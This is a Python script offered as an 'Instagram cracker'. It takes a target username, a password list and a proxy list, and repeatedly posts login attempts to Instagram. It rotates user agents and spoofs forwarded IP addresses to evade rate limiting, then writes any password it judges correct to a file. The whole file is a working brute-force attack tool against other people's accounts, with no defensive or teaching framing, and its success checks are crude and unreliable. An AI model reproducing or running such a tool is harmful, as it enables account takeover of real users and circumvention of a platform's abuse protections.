#!/usr/bin/python
#.......................................
#.......................................
# ========== Instagram cracker =========
#qF0y9          Igw0E     IwRSH      eGOV_       acqo5   _4EzTm 
# ............................
_author_ = 'the mr@root'
_version_ = '1.0.0'
_id_ = 'rubika.ir/theserver'
# ............................
import os, sys, time, random, uuid, re
try:
    import requests
except:
    os.system ('pip install requests')
    import requests
try:
    import pyuseragents
except:
    os.system ('pip install pyuseragents')
    import pyuseragents
try:
    import pyfiglet
except:
    os.system ('pip install pyfiglet')
    import pyfiglet
try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install bs4')
    from bs4 import BeautifulSoup
# ............................
try:
    os.system ('clear')
except:
    os.system ('cls')
print ('\033[92m')
try:
    os.system ("date")
except:
    pass
# .............................
time.sleep(1)
print ('\n')
logo = ['instagram', 'cracker', 'insta . com']
banner = (random.choice(logo))
bnr = pyfiglet.figlet_format(banner)
print ('\033[95m')
print (bnr)
time.sleep(1)
print ('\n\033[20;37m[~] im insta cracker my creator > \033[35m@\033[92mTHEserver\n')
user = input('''\n\033[31m[?] \033[36menter target username <Instagram>

\033[20;37m┌─\033[93m[\033[31mroot\033[20;37m@\033[92minsta\033[93m]\033[20;37m─\033[93m[\033[92m~\033[93m]
\033[20;37m└──╼ \033[95m❯❯❯ \033[0;37m''')

req = requests.get(f'https://www.Instagram.com/{user}')
if req.status_code == 200:
    print (f'\n\033[20;36m[*] user found => @{user}\n')
else:
    print (f'\n\033[31m[!] \033[35mpage not found => @{user}\n')
    exit (1)
time.sleep(0.8)
from insta import pas
pas.password(user)
time.sleep(1)
pas = input('''\n\n\033[31m[?] \033[36menter your \033[35m<password-list>

\033[20;37m┌─\033[93m[\033[31mroot\033[20;37m@\033[92minsta\033[93m]\033[20;37m─\033[93m[\033[92m~\033[93m]
\033[20;37m└──╼ \033[95m❯❯❯ \033[0;37m''')
time.sleep(1)
print ('\n')
try:
    ps = open(pas, 'r').read().split()
except:
    while True:
        time.sleep(0.5)
        print (f'\n\033[31m[!]\033[35m [{pas}] not found password-list ~')
        pas = input('\n\033[31m[?] \033[36menter your \033[35m<password-list>\033[31m [>] \033[20;37m')
        try:
            ps = open(pas, 'r').read().split()
            break
        except:
            pass
# .........................
ps = open(pas, 'r').read().split()
try:
    proxy = open('socks5.txt', 'r').read().split()
except:
    while True:
        pro = input ('\n\033[31m[?] \033[36menter your list-proxy \033[31m_> \033[20;37m')
        try:
            proxy = open(pro, 'r').read().split()
            break
        except:
            pass
# .......... start .........
print (f'\n\033[0m[+] TARGET => @{user} > ..\n')

for pss in ps:
    for prx in proxy:
        try:
            proxi = {'http': prx}
            #sub = ('''qF0y9          Igw0E     IwRSH      eGOV_       acqo5   _4EzTm''')
            print ()
            time.sleep(0.5)
            ips = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
            uid:str = (uuid.uuid4())
            headers = {'User-Agent': pyuseragents.random(),'Accept': "*/*",'Cookie': 'missing','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US','X-IG-Capabilities': '3brTvw==','X-IG-Connection-Type': 'WIFI','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'instagram.com','X-Forwarded-For': ips}
            server = (f'https://www.instagram.com/accounts/login/?next=/{user}/')
            #payload = {'uuid': uid,'password': pss,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0', 'submit':'log in'}
            data = {'username': user, 'password': pss, 'uuid':uid, 'from_reg':'false', '_csrftoken': 'missing','login_attempt_countn':'0','submit':'log in'}
            #head = {"scheme": "https","host": "graph.instagram.com","filename": "/logging_client_events","remote": {"Address": ips}, 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AIW8vu6H6AHA7Cyatxu4elN', 'x-fb-trace-id': 'Buw1EXSZ+A4', 'x-fb-rev': '1005818168', 'X-FB-Debug': 'INvVSJKJQLRwye7IcRcym6LNOyjTqOJNUoki8RRdYuznsC5FvT4fzzGk0mYwaTuQBa0N7giOyS1K2f8N+nTNTA==', 'Date': 'Sat, 09 Jul 2022 19:13:17 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
            #host = 'https://graph.instagram.com'
            #hed = {'Host': host, 'User-Agent': pyuseragents.random(), 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AfEFkZ2G8RvQ8w6a9gFIKXt', 'x-fb-trace-id': 'CAiOl2db1BY', 'x-fb-rev': '1005818210', 'X-FB-Debug': 'fRa2DaGgArwlMQ5xPaM0H4ygWOLc1MbdJ+fNKKQg10Eghb+jCV+nFx3LiXkyJ65dmxm/XiC5wKc8R0yXjGJRgQ==', 'Date': 'Sat, 09 Jul 2022 21:07:37 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
            #try:
                #req = requests.get(host)
            #except:
                #pass
            #try:
                #token = req.json['access_token']
            #except:
                #None
            #try:
                #message = req.json['message']
            #except:
                #pass
            #adad = random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)+random.randint(0,9)
            #def choices():
                #hash = ''
                #hashs = [*'qwertyuiopasdfghjklzxcvbnm0123456789']
                #for m in range(32):
                    #hash += choice(hashs)
                #return hash
            #token = adad+choices()
            #json = {'access_token': token, 'message': message}
            #the = {'access_token': token,'message': '{\"app_id\":\"936619743392459\",\"app_ver\":\"1.0.0\",\"data\":[{\"time\":1657390570.175,\"name\":\"instagram_web_client_events\",\"extra\":{\"event_type\":\"action\",\"event_name\":\"loginSuccess\",\"mid\":\"YslyOQALAAHlCPDuzqWqZW4GIOTP\",\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"fb\":false,\"platform\":\"windows_nt_10\",\"source\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"},\"module\":\"loginPage\",\"obj_type\":\"url\",\"obj_id\":\"/accounts/login/?source=auth_switcher\"},{\"time\":1657390570.185,\"name\":\"instagram_web_time_spent_navigation\",\"extra\":{\"rollout_hash\":\"ebe60d79ce7c\",\"frontend_env\":\"prod\",\"app_id\":\"936619743392459\",\"event\":\"unload\",\"client_time\":1657390570184,\"time_spent_id\":\"qsqy2g\",\"extra_data\":{},\"source_endpoint\":\"loginPage\",\"referrer\":\"/accounts/login/?source=auth_switcher\",\"referrer_domain\":\"www.instagram.com\",\"url\":\"/accounts/login/?source=auth_switcher\",\"original_referrer\":\"https://www.google.com/\",\"original_referrer_domain\":\"www.google.com\"}}],\"log_type\":\"client_event\",\"seq\":16,\"session_id\":\"181e429fec8-13aece\",\"device_id\":\"3BAF6D5C-0E19-4B2C-A71F-B2A791E6C65C\",\"claims\":[\"hmac.AR251Qhmn7X4ARb3A9GGxEaSfeBq2qC24nBwdcMmq5I-TQna\"]}'}
            num = 0
            number = 10
            num = int(num)
            number = int(number)
            try:
                rq = requests.post(server, headers=headers, data=data, proxies=proxi)
            except:
                while num < number:
                    time.sleep(0.4)
                    try:
                        rq = requests.post(server, headers=headers, data=data, proxies=proxi)
                        break
                    except:
                        pass
                    num = (num+1)
                time.sleep(0.5)
                print ('\n\033[31m[!] \033[35mserver offline')
                time.sleep(0.8)
                try:
                    exit (2)
                except:
                    sys.exit()
            #try:
                #requests.post(host, headers=hed, json=the)
            #except:
                #try:
                    #requests.post(host, headers=hed, json=json)
                #except:
                    #pass
            rq = requests.post(server, headers=headers, data=data, proxies=proxi)
            r = requests.get(server,headers=headers, proxies=proxi)
            _rq_ = BeautifulSoup(r.text , 'html.parser')
            _req_ = _rq_.find('input')['submit']
            data = {'username': user, 'password': pss, 'uuid':uid, 'from_reg':'false', '_csrftoken': 'missing','login_attempt_countn':'0','submit':_req_}
            rq = requests.post(server, headers=headers, data=data, proxies=proxi)    
            #if rq.status_code != 200:
                #time.sleep(1)
                #print ('\n\033[31m[!] check network or use vps\n')
                #time.sleep(1)
            if 'anonymous'.lower() in rq.text or 'logged_in_user'.lower() in rq.text or 'logged-in-user'.lower() in rq.text or 'Save Your Login Info?'.lower() in rq.text or "We can save your login info on this browser so you don't need to enter it again.".lower() in rq.text or 'Home'.lower() in rq.text:
                print(f'\n\033[31m[*]\033[36m password found => \033[35m[{pss}]')
                with open('tar.txt', 'w') as tr:
                    tr.write(f'target > {user}\npassword > {pss}')
                    print ('\n\033[31m[+] \033[93m[saved info in \033[31m<tar.txt> \033[93m]')
                break
            elif re.search('Use the App'.lower(), rq.text):
                print(f'\n\033[31m[*]\033[36m password found => \033[35m[{pss}]')
                with open('tar.txt', 'w') as tr:
                    tr.write(f'target > {user}\npassword > {pss}')
                    print ('\n\033[31m[+] \033[93m[saved info in \033[31m<tar.txt> \033[93m]')
                break
            elif re.search('Save Your Login Info?'.lower(), rq.text):
                print(f'\n\033[31m[*]\033[36m password found => \033[35m[{pss}]')
                with open('tar.txt', 'w') as tr:
                    tr.write(f'target > {user}\npassword > {pss}')
                    print ('\n\033[31m[+] \033[93m[saved info in \033[31m<tar.txt> \033[93m]')
                break
            elif 'Save Your Login Info?'.lower() in _rq_ or 'Home'.lower() in _rq_:
                print(f'\n\033[31m[*]\033[36m password found => \033[35m[{pss}]')
                with open('tar.txt', 'w') as tr:
                    tr.write(f'target > {user}\npassword > {pss}')
                    print ('\n\033[31m[+] \033[93m[saved info in \033[31m<tar.txt> \033[93m]')
                break
            elif 'We can send you an email to help you get back into your account.' in rq.text or f'Forgot Password for {user}'.lower() in rq.text:
                print(f'\n\033[31m[*]\033[36m password found => \033[35m[{pss}]')
                with open('tar.txt', 'w') as tr:
                    tr.write(f'target > {user}\npassword > {pss}')
       
                    print ('\n\033[31m[+] \033[93m[saved info in \033[31m<tar.txt> \033[93m]')
                break
            elif 'check your username'.lower() in rq.text:
                print (f'\n\033[31m[!] \033[35musername not true => @{user}\n')
            elif 'Incorrect Password' in rq.text or 'The password you entered is incorrect. Please try again.' in rq.text or 'The password you entered is incorrect.'.lower() in rq.text or "unusable_password".lower() in rq.text:
                print(f'\n\033[31m[!] \033[35m{user}|{pss} \033[31mnot found')
            elif 'bad request'.lower() in rq.text or 'Please wait a few minutes'.lower() in rq.text or 'challenge_required'.lower() in rq.text or 'two'.lower() in rq.text:
                print('\n\033[31m[!] \033[35m please change it ip address')
            elif 'login-error-message' in rq.text:
                print(f'\n\033[31m[!] \033[35m{user}|{pss} \033[31mnot found')
            elif "We couldn't connect to Instagram. Make sure you're connected to the internet and try again." in rq.text:
                print('\n\033[31m[!] \033[35mNETWORK [OFF]\n')
            else:
                pass
        except KeyboardInterrupt:
            print('\n\033[31m[!] server offline')
            try:
                exit()
            except:
                sys.exit()
        except:
            time.sleep(1)
            print ('\n\033[31m[!] error - \033[35mplease check internet \033[36mtry again')
            time.sleep(1)
            exit ()
# .......... ended ..........
